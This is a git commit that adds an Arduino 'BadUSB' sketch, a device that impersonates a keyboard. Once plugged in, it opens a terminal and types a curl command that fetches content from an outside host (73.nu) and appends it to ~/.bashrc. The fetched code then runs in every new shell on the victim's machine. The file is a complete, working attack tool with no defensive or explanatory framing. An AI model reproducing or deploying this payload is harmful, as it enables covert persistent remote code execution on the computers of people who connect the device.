3c99f26dca63004fa6160b1910e10aa10711ba80
DrayNeur <drayneur.3026@gmail.com>
2025-01-28 16:13:45 +0100

    finished

---
+++ badusb/badusb.ino
@@ -0,0 +1,30 @@
+#include <Keyboard.h>
+
+void setup()
+{
+  Keyboard.begin();
+  
+  delay(500);
+
+  delay(3000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print("curl -s 73.nu/h0v >> ~/.bashrc");
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+
+}
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void loop() {}
